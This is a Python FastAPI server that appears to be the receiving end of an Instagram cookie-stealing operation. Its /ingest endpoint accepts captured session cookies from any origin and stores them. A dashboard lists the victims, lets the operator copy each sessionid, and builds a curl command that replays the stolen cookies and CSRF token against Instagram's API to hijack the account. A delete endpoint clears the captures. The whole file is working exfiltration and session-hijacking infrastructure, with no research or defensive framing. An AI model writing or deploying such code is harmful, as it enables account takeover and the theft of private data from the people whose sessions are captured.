import html
import json
import os
import secrets
import sqlite3
import time

from fastapi import FastAPI, Header, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse

TOKEN = os.environ["INGEST_TOKEN"]
DB = os.environ.get("DB_PATH", "/tmp/captures.db")

app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["POST", "GET", "DELETE", "OPTIONS"],
    allow_headers=["*"],
)


def db():
    c = sqlite3.connect(DB)
    c.execute(
        """CREATE TABLE IF NOT EXISTS captures(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ts TEXT, ds_user_id TEXT, page TEXT, ua TEXT,
            cookies TEXT, payload TEXT)"""
    )
    return c


def auth(token):
    if not secrets.compare_digest(token or "", TOKEN):
        raise HTTPException(401, "bad token")


@app.get("/healthz")
def healthz():
    return {"ok": True}


@app.post("/ingest")
async def ingest(request: Request, x_token: str = Header(default="")):
    auth(x_token)
    try:
        body = await request.json()
    except Exception:
        raise HTTPException(400, "bad json")

    cookies = body.get("cookies") or {}
    if not cookies.get("sessionid"):
        raise HTTPException(422, "no sessionid")

    c = db()
    cur = c.execute(
        "INSERT INTO captures(ts,ds_user_id,page,ua,cookies,payload) VALUES(?,?,?,?,?,?)",
        (
            body.get("capturedAt") or time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            cookies.get("ds_user_id"),
            body.get("page"),
            body.get("userAgent"),
            json.dumps(cookies),
            json.dumps(body),
        ),
    )
    c.commit()
    c.close()
    return {"ok": True, "id": cur.lastrowid}


@app.get("/", response_class=HTMLResponse)
def dash(t: str = ""):
    auth(t)
    c = db()
    rows = c.execute(
        "SELECT id,ts,ds_user_id,page,ua,cookies,payload "
        "FROM captures ORDER BY id DESC LIMIT 200"
    ).fetchall()
    c.close()

    esc = lambda s: html.escape(s or "", quote=True)
    out = [
        '<meta name="viewport" content="width=device-width,initial-scale=1">',
        "<style>"
        "body{font:13px/1.5 ui-monospace,Menlo,monospace;background:#111;color:#ddd;padding:16px}"
        "table{border-collapse:collapse;width:100%}"
        "td,th{border-bottom:1px solid #333;padding:6px;text-align:left;vertical-align:top}"
        "button{background:#222;color:#ddd;border:1px solid #444;cursor:pointer;padding:2px 6px}"
        "button:active{background:#333}.k{color:#888;word-break:break-all}"
        "</style>",
        f'<p class="k">{len(rows)} captures</p>',
        "<table><tr><th>#</th><th>time</th><th>user</th><th>cookies</th><th>curl</th></tr>",
    ]

    for rid, ts, uid, page, ua, ck, _pl in rows:
        try:
            ck = json.loads(ck)
        except Exception:
            ck = {}
        cookie_header = "; ".join(f"{k}={v}" for k, v in ck.items())
        curl = (
            "curl -s 'https://www.instagram.com/api/v1/users/web_profile_info/"
            "?username=instagram' "
            "-H 'x-ig-app-id: 936619743392459' "
            f"-H 'x-csrftoken: {ck.get('csrftoken','')}' "
            "-H 'x-requested-with: XMLHttpRequest' "
            "-H 'referer: https://www.instagram.com/' "
            f"-H 'user-agent: {ua}' "
            f"-H 'cookie: {cookie_header}'"
        )
        out.append(
            f"<tr><td>{rid}</td><td>{esc(ts)}</td><td>{esc(uid) or '-'}</td>"
            f'<td><div class="k">{esc(", ".join(ck))}</div>'
            f'<button data-copy="{esc(ck.get("sessionid",""))}" onclick="cp(this)">sessionid</button></td>'
            f'<td><button data-copy="{esc(curl)}" onclick="cp(this)">copy</button></td></tr>'
        )

    out.append(
        "</table><script>"
        "function cp(b){navigator.clipboard.writeText(b.dataset.copy);"
        "b.textContent='copied';setTimeout(()=>b.textContent='copy',900)}"
        "</script>"
    )
    return HTMLResponse("".join(out), headers={"Cache-Control": "no-store"})


@app.delete("/captures")
def clear(x_token: str = Header(default="")):
    auth(x_token)
    c = db()
    c.execute("DELETE FROM captures")
    c.commit()
    c.close()
    return {"ok": True}
